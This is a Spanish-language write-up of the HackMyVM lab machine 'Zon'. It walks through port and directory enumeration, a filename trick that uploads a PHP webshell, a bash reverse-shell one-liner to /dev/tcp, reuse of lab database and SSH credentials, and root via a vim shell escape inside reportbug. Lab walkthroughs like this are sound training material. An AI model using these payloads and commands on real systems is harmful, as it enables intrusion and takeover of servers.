---
layout: default
title: Zon
parent: HackMyVM
grand_parent: Writeups
---

# Zon
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Enumeracion

Iniciamos con un escaneo de nmap donde encontraremos el puerto 22(SSH) y 80(HTTP)

```ruby
nmap -sS -n -Pn --open -p- 192.168.1.74
```
- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si el puerto esta abierto

 - n: para que no haga resolucion DNS y tarde menos el escaneo

 - Pn: para evitar el descubrimiento de hosts

 - open: para que solo muestre los puertos abiertos

 - -p-: para que escanee todo el rango de puertos

```ruby
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Directory Fuzzing

Al principio intente hacer fuzzing con el diccionario de **directory-list-2.3-medium.txt** pero no encontre nada, por lo que use uno de archivos, y encontre el endpoint **choose.php** haciendo uso de gobuster

```ruby
gobuster dir -u 192.168.1.74 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 50
```
```ruby
/choose.php           (Status: 200) [Size: 1908]
```

## Explotacion (Arbitrary File Upload)

Viendo el funcionamiento de **choose.php**, vemos que podemos subir archivos .zip con archivos .jpeg dentro, y una vez subidos, se encuentran en el recurso **/uploads**. Si intentamos subir un archivo que no es jpeg, nos muestra algo como esto

    File prueba.zip has been uploaded.Archive contains non-JPEG files. It will be deleted.

En este punto podriamos probar tratar de hacer bypass de algunos filtros o hacer zip symlik pero no sera necesario, despues de una busqueda, encontre una forma de hacer **command injection** a travez del nombre del archivo que se sube a un sitio web, como se explica en este blog: [https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities#abuse-filename](https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities#abuse-filename)

Vemos que nos dice podemos ejecutar comandos si subimos un archivo con este nombre **a$(whoami)z.jpeg**, que viendo su funcionamiento, se trendria que hacer la expansion de comandos y mostrar el resultado de **whoami**, intente eso pero subiendo una webshell y no me funciono, entonces se me ocurrio que podria ser el nombre del archivo, asi que tenia que ponerlo de forma literal usando comillas simples para que no me escapara los caracteres especiales como el espacio, ademas de poner la extension **.jpeg**  para que lo aceptara. Asi que los pasos fueron:

1. Crear un archivo php que sea una webshell, yo use: **<?php system($_GET['cmd']); ?>**

2. Renombar el archivo:  
    ```ruby
    cp shell.php 'hola.jpeg .php'
    ```
    Se tiene que poner el espacio y entre comillas para que se interprete de forma literal, como se ve en la imagen en el archivo de arriba, y cuando se procese se elimine el espacio en blanco

    ![](/assets/img/zon/1.png)

3. Y por ultimo se comprime: **zip ola.zip 'hola.jpeg .php'**

Una vez que se suba, veremos nuestro archivo php, y habemos podido conseguir RCE

![](/assets/img/zon/3.png)

![](/assets/img/zon/2.png)

Ahora nos podemos enviar una reverse shell usando bash:

```bash
bash -i >& /dev/tcp/<ip>/443 0>&1 <-- Usar URL encode
```

#### ¿Por que funciona?

Si vemos el archivo **upload.php** encargado de la subida del archivo,  vemos la parte en la que hace el filtrado:

```php
$command = "unzip -l " . escapeshellarg($target_file) . " | awk '{print $4}' | grep -v \"\\.jpeg$\" | grep . | tail -n1 | grep \"\\.\"";
        exec($command, $output, $return_var);
```

- Se usa **escapeshellarg** para escapar los caracteres especiales del nombre del archivo
- Despues se usa **awk '{print $4}'** para imprimir la cuarta columna, la cual es el nombre del archivo
- Despues usando grep para filtrar y excluir los que tienen ".jpeg"
- Despues usando otro grep filtra por los archivos que contengan almenos un **.**
- Y para finalizar usa otro grep para filtrar los archivos que tienen un solo punto seguido, es decir, **.** y no **..**, por lo que si el archivo tiene esto **archivo.jpeg ..php**, no lo aceptaria, por tener dos puntos seguidos antes del php

Basicamente funciona por que solo se esta filtrando que contenga la cadena **.jpeg** mas no por toda la extension del archivo, asi que solo es necesario agregar el espacio (que luego sera eliminado) y el **.jpeg** para hacer bypass de ese filtro, seguido de la extension **.php**, quedando el archivo despues de procesar como: **archivo.jpeg.php**

## www-data -> freddie

Si realizamos una busqueda para mostrar los archivos asociados a un grupo, encontraremos uno que se llama **hashdb.sh**

```ruby
find / -type f -group www-data 2> /dev/null
```
```ruby
/var/www/html/hashDB.sh
```

Al ver si contenido, nos podemos dar cuenta que se conecta a mysql y se filtran las credenciales: **admin:-pudgrJbFc6Av#U3**

```bash
#!/bin/bash

# script that checks the database's integrity every minute

dump=/dev/shm/dump.sql
log=/var/log/db_integrity_check.log
true > "${log}"

/usr/bin/mysqldump -u admin -pudgrJbFc6Av#U3 admin credentials > "${dump}" <-- Credenciales
/usr/bin/sed -i '$d' "${dump}"

hash="29d8e6b76aab0254f7fe439a6a5d2fba64270dde087e6dfab57fa57f6749858a"
check_hash=$(sha256sum "${dump}" | awk '{print $1}')

if [[ "${hash}" != "${check_hash}" ]] ; then
  /usr/bin/wall "Alert ! Database hacked !"
  /usr/bin/du -sh /var/lib/mysql >> "${log}"
  /usr/bin/vmstat 1 3 >> "${log}"
else
  /usr/bin/sync && /usr/bin/echo 3 > /proc/sys/vm/drop_caches
  /usr/bin/echo "$(date) : Integrity check completed for ${dump}" >> "${log}"
fi
```

Si nos conectamos, y mostramos las bases de datos, en la base de datos  **admin** encontramos la tabla **credentials** y las credenciales del usuario **freddie** que usaremos en ssh

![](/assets/img/zon/4.png)

usr: freddie

pass: LDVK@dYiEa2I1lnjrEeoMif

## Escalada de privilegios

Al mostrar los permisos a nivel de sudoers podremos ver el archivo **/usr/bin/reportbug** que es un script de python

```ruby
file /usr/bin/reportbug
/usr/bin/reportbug: Python script, ASCII text executable
```
La verdad ni lo vi completo, pero jugue con las funciones, y parece ser un script que enviar reportes de bugs en paquetes de debian, pero, la cuestion es que en un punto nos dice que editor queremos usar y nos da las opciones de **vim** y **nano**, si hacemos una busqueda en GFTOBins, nos dice que podemos spawnear una shell usando ese editor: [https://gtfobins.github.io/gtfobins/vim/](https://gtfobins.github.io/gtfobins/vim/)

Asi que los pasos a seguir son

1. Ejecutar el script y seleccionar la opcion 4 (expert) y rellenar los datos
2. Volvelo a ejecutar y cuando nos diga *Please enter the name of the package in which you have found a problem*, ingresamos "other"
3. Ponemos el numero **12**
4. Si sale el prompt: *Is the bug you found listed above* , le damos **s**
5. Si sale *Please select a severity level:*, le damos **4**
6. Si sale: *Please select tags: (one at a time)*, le damos enter
7. Despues nos deberia de pedir el editor, seleccionamos **vim** e ingresamos estos comandos de vim

```ruby
set shell=/bin/bash
```

Y despues mandamos a llamar a la variable escribiendo **shell** y ya seremos root

![](/assets/img/zon/5.png)

(Espero que me haya explicado bien en esta parte)

Eso ha sido todo, gracias por leer ❤



